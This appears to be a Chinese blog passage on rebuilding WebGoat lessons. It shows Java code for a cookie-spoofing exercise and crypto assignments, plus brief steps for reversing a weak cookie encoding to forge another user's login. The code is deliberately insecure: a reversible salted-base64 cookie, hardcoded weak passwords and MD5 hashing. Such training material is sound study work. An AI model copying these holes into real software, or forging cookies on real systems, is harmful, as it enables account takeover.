<p>这里为甚是两个用户也即是这里的原因</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220902094938519.png" alt="image-20220902094938519"></p>
<p>接着去提交它的hash 如果发现多个hash提交第一个即可,因为只对比第一个</p>
<h2 id="spoofcookie"><a href="#spoofcookie" class="headerlink" title="spoofcookie"></a>spoofcookie</h2><h3 id="SpoofCookie"><a href="#SpoofCookie" class="headerlink" title="SpoofCookie"></a>SpoofCookie</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.spoofcookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpoofCookie</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;spoofcookie.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SpoofCookieAssignment"><a href="#SpoofCookieAssignment" class="headerlink" title="SpoofCookieAssignment"></a>SpoofCookieAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.spoofcookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.spoofcookie.encoders.EncDec;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.UnsatisfiedServletRequestParameterException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpoofCookieAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COOKIE_NAME</span> <span class="operator">=</span> <span class="string">&quot;spoof_auth&quot;</span>;</span><br><span class="line"><span class="comment">//    定义cookie的名字</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COOKIE_INFO</span> <span class="operator">=</span> <span class="string">&quot;Cookie details for user %s:&lt;br /&gt;&quot;</span> + COOKIE_NAME + <span class="string">&quot;=%s&quot;</span>;</span><br><span class="line"><span class="comment">//    作为cookie的标准化形式 用于以后的格式化输出入</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ATTACK_USERNAME</span> <span class="operator">=</span> <span class="string">&quot;tom&quot;</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String ,String &gt; users = Map.of(</span><br><span class="line">            <span class="string">&quot;webgoat&quot;</span>,<span class="string">&quot;webgoat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            ATTACK_USERNAME,<span class="string">&quot;apasswordfortom&quot;</span>);</span><br><span class="line"><span class="comment">//          定义users 用户 map</span></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/SpoofCookie/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(UnsatisfiedServletRequestParameterException.class)</span></span><br><span class="line"><span class="comment">//  没太理解 当不满足下面的请求结构统一抛异常出去?</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam</span> String username,</span></span><br><span class="line"><span class="params">//            获取用户参数</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam</span> String password,</span></span><br><span class="line"><span class="params">//</span></span><br><span class="line"><span class="params">            <span class="meta">@CookieValue(value = COOKIE_NAME , required = false )</span> String cookieValue,</span></span><br><span class="line"><span class="params">//            获取 cookie的值 非必须</span></span><br><span class="line"><span class="params">            HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(cookieValue))&#123;</span><br><span class="line"><span class="comment">//            如果cookie是空的 就到验证用户登录的地方</span></span><br><span class="line">            <span class="keyword">return</span> credentialsLoginFlow(username,password,response);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//            如果存在cookie就去验证cookie</span></span><br><span class="line">            <span class="keyword">return</span> cookieLoginFlow(cookieValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/SpoofCookie/cleanup&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cleanup</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line"><span class="comment">//        这里是删除cookie</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(COOKIE_NAME,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//      先给一个空cookie</span></span><br><span class="line">        cookie.setMaxAge(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//        设置cookie期限是0 也就是立即结束</span></span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line"><span class="comment">//        添加cookie</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">credentialsLoginFlow</span><span class="params">(String username,String password,HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">lowerCasedUsername</span> <span class="operator">=</span> username.toLowerCase();</span><br><span class="line"><span class="comment">//        获取用户名的小写</span></span><br><span class="line">        <span class="keyword">if</span> (ATTACK_USERNAME.equals(lowerCasedUsername) &amp;&amp; users.get(lowerCasedUsername).equals(password))&#123;</span><br><span class="line"><span class="comment">//            如果登录的用户名是 tom  并且 得到的用户名 与 password相同</span></span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;spoofcookie.cheating&quot;</span>).build();</span><br><span class="line"><span class="comment">//            返回 不要作弊?</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">authPassword</span> <span class="operator">=</span> users.getOrDefault(lowerCasedUsername,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//        如果 如果 users中存在这个键 就返回这个键的值 如果不存在就返回空</span></span><br><span class="line">        <span class="keyword">if</span> (!authPassword.isBlank() &amp;&amp; authPassword.equals(password))&#123;</span><br><span class="line"><span class="comment">//            如果密码不存在空白字符 并且 给的密码等于users中的密码</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">newCookieValue</span> <span class="operator">=</span> EncDec.encode(lowerCasedUsername);</span><br><span class="line"><span class="comment">//            就加密下cookie</span></span><br><span class="line">            <span class="type">Cookie</span> <span class="variable">newCookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(COOKIE_NAME,newCookieValue);</span><br><span class="line"><span class="comment">//            新建一个cookie</span></span><br><span class="line">            newCookie.setPath(<span class="string">&quot;/WebGoat&quot;</span>);</span><br><span class="line"><span class="comment">//            设置cookie路径</span></span><br><span class="line">            newCookie.setSecure(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            通过安全协议发送</span></span><br><span class="line">            response.addCookie(newCookie);</span><br><span class="line"><span class="comment">//            在响应上面添加cookie</span></span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;spoofcookie.login&quot;</span>)</span><br><span class="line"><span class="comment">//                    返回已经得到cookie</span></span><br><span class="line">                    .output(String.format(COOKIE_INFO,lowerCasedUsername,newCookie.getValue()))</span><br><span class="line"><span class="comment">//                    输出cookie的值</span></span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>)</span><br><span class="line">                .feedback(<span class="string">&quot;spoofcookie.wrong-login&quot;</span>)</span><br><span class="line"><span class="comment">//                返回登录失败</span></span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">cookieLoginFlow</span><span class="params">(String cookieValue)</span>&#123;</span><br><span class="line">        String cookieUsername;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cookieUsername = EncDec.decode(cookieValue).toLowerCase();</span><br><span class="line"><span class="comment">//            解密cookie</span></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (users.containsKey(cookieUsername))&#123;</span><br><span class="line"><span class="comment">//            如果users中包含 cookie中的username</span></span><br><span class="line">            <span class="keyword">if</span> (cookieUsername.equals(ATTACK_USERNAME))&#123;</span><br><span class="line"><span class="comment">//                如果cookiename等于 tom</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;spoofcookie.cookie-login&quot;</span>)</span><br><span class="line"><span class="comment">//                    返回使用cookie登录</span></span><br><span class="line">                    .output(String.format(COOKIE_INFO,cookieUsername,cookieValue)).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;spoofcookie.wrong-cookie&quot;</span>).build();</span><br><span class="line"><span class="comment">//        返回cookie错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h3><h4 id="EncDec"><a href="#EncDec" class="headerlink" title="EncDec"></a>EncDec</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.spoofcookie.encoders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.RandomStringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.codec.Hex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncDec</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SALT</span> <span class="operator">=</span> RandomStringUtils.randomAlphabetic(<span class="number">10</span>);</span><br><span class="line"><span class="comment">//    生成一个随机字符串密钥常量作为盐 长度为10</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">EncDec</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="comment">//    私有构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> value.toLowerCase() + SALT;</span><br><span class="line"><span class="comment">//        把需要加密的值与salt相加</span></span><br><span class="line">        encoded = revert(encoded);</span><br><span class="line"><span class="comment">//        该函数将加密值进行逆序输出为字符串</span></span><br><span class="line">        encoded = hexEncode(encoded);</span><br><span class="line"><span class="comment">//        进行16进制编码</span></span><br><span class="line">        <span class="keyword">return</span> base64Encode(encoded);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(<span class="keyword">final</span> String encodedValue)</span> <span class="keyword">throws</span> IllegalArgumentException&#123;</span><br><span class="line"><span class="comment">//        抛出参数非法异常</span></span><br><span class="line">        <span class="keyword">if</span> (encodedValue == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decoded</span> <span class="operator">=</span> base64Decode(encodedValue);</span><br><span class="line"><span class="comment">//        先进行base64解码</span></span><br><span class="line">        decoded = hexDecode(decoded);</span><br><span class="line"><span class="comment">//        接着进行16进制解码</span></span><br><span class="line">        decoded = revert(decoded);</span><br><span class="line"><span class="comment">//        将字符串逆序输出</span></span><br><span class="line">        <span class="keyword">return</span> decoded.substring(<span class="number">0</span>,decoded.length() - SALT.length());</span><br><span class="line"><span class="comment">//        对解密后的字符串 去除盐值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String  <span class="title function_">revert</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(value)</span><br><span class="line">                .reverse()</span><br><span class="line">                .toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">hexEncode</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"><span class="comment">//            调用 静态方法将字符输出为数组 在转换为string返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">hexDecode</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Hex.decode(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decoded);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line"><span class="comment">//        调用 base64编码器 将数组转换为 base64字符串</span></span><br><span class="line">        <span class="keyword">return</span> Base64</span><br><span class="line">                .getEncoder()</span><br><span class="line">                .encodeToString(value.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">base64Decode</span><span class="params">(<span class="keyword">final</span> String value)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64</span><br><span class="line">                .getDecoder()</span><br><span class="line">                .decode(value.getBytes());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decoded);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103710214.png" alt="image-20220903103710214"></p>
<p>base64解码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103940162.png" alt="image-20220903103940162"></p>
<p>16进制转字符</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903103948675.png" alt="image-20220903103948675"></p>
<p>逆序输出</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104030709.png" alt="image-20220903104030709"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104149969.png" alt="image-20220903104149969"></p>
<p>可以简单发现前面是 用户名 后面是一个固定值</p>
<p>加密cookie</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104310909.png" alt="image-20220903104310909"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104326774.png" alt="image-20220903104326774"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104337933.png" alt="image-20220903104337933"></p>
<p>更改cookie登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104800000.png" alt="image-20220903104800000"></p>
<h2 id="cryptography"><a href="#cryptography" class="headerlink" title="cryptography"></a>cryptography</h2><h3 id="EncodingAssignment"><a href="#EncodingAssignment" class="headerlink" title="EncodingAssignment"></a>EncodingAssignment</h3><p>需要先完成 HashingAssignment该部分编写 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133231225.png" alt="image-20220903133231225"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodingAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBasicAuth</span><span class="params">(String username,String password)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(username.concat(<span class="string">&quot;:&quot;</span>).concat(password).getBytes());</span><br><span class="line"><span class="comment">//        获取认证 首先将用户名和 密码进行拼接 接着编码为 base64</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/crypto.encoding/basic&quot;,produces = MediaType.TEXT_HTML_VALUE)</span></span><br><span class="line"><span class="comment">//    生产html字符</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBasicAuth</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">basicAuth</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;basicAuth&quot;</span>);</span><br><span class="line"><span class="comment">//        从session中获取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getUserPrincipal().getName();</span><br><span class="line"><span class="comment">//      获取当前登录的用户名</span></span><br><span class="line">        <span class="keyword">if</span> (basicAuth == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            如果 认证为空</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> HashingAssignment.SECRETS[<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(HashingAssignment.SECRETS.length)];</span><br><span class="line"><span class="comment">//            从常量中随机挑选一个作为密码</span></span><br><span class="line">            basicAuth = getBasicAuth(username,password);</span><br><span class="line"><span class="comment">//            获取base64值</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;basicAuth&quot;</span>,basicAuth);</span><br><span class="line"><span class="comment">//            添加到session中去</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authorization: Basic &quot;</span>.concat(basicAuth);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/crypto/encoding/basic-auth&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String answer_user,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String answer_pwd)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">basicAuth</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;basicAuth&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (basicAuth != <span class="literal">null</span> &amp;&amp; answer_user != <span class="literal">null</span> &amp;&amp; answer_pwd != <span class="literal">null</span> &amp;&amp; basicAuth.equals(getBasicAuth(answer_user,answer_pwd)))&#123;</span><br><span class="line"><span class="comment">//            如果 base 不为空 并且 answer不为空 并且与base64相等</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;crypto-encoding.success&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-encoding.empty&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133620704.png" alt="image-20220903133620704"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133644095.png" alt="image-20220903133644095"></p>
<h3 id="XOREncodingAssignment"><a href="#XOREncodingAssignment" class="headerlink" title="XOREncodingAssignment"></a>XOREncodingAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;crypto-encoding-xor.hints.1&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XOREncodingAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/crypto/encoding/xor&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String answer_pwd1)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (answer_pwd1 != <span class="literal">null</span> &amp;&amp; answer_pwd1.equals(<span class="string">&quot;databasepassword&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            简单的进行字符串的对比</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;crypto-encoding-xor.empty&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                .feedback(<span class="string">&quot;crypto-encoding-xor.empty&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905190857076.png" alt="image-20220905190857076"></p>
<p>这里其实考察的是 webSphere 解密</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191051993.png" alt="image-20220905191051993"></p>
<p>这里我找到了这个网站</p>
<p><a target="_blank" rel="noopener" href="http://www.sysman.nl/wasdecoder/">http://www.sysman.nl/wasdecoder/</a></p>
<p>先进行base64解密在 解密一次即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191233290.png" alt="image-20220905191233290"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191549601.png" alt="image-20220905191549601"></p>
<h3 id="HashingAssignment"><a href="#HashingAssignment" class="headerlink" title="HashingAssignment"></a>HashingAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.sql.DataTruncation;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;crypto-hashing.hints.1&quot;,&quot;crypto-hashing.hints.2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashingAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String [] SECRETS = &#123;<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;passw0rd&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/crypto/hashing/md5&quot;,produces = MediaType.TEXT_HTML_VALUE)</span></span><br><span class="line"><span class="comment">//    这里是返回文本</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMd5</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchAlgorithmException&#123;</span><br><span class="line"><span class="comment">//当请求特定加密算法但在环境中不可用时，抛出此异常</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">md5Hash</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;md5Hash&quot;</span>);</span><br><span class="line"><span class="comment">//        获取session中的md5Hash</span></span><br><span class="line">        <span class="keyword">if</span> (md5Hash == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            如果获取到是空</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> SECRETS[<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(SECRETS.length)];</span><br><span class="line"><span class="comment">//            就通过密钥随机生成一个</span></span><br><span class="line">            <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line"><span class="comment">//            获取一个md5 加密对象 因为是单例的所以直接获取 应该是单例吧</span></span><br><span class="line">            md.update(secret.getBytes());</span><br><span class="line"><span class="comment">//            将得到的字符串进去处理一下</span></span><br><span class="line">            <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line"><span 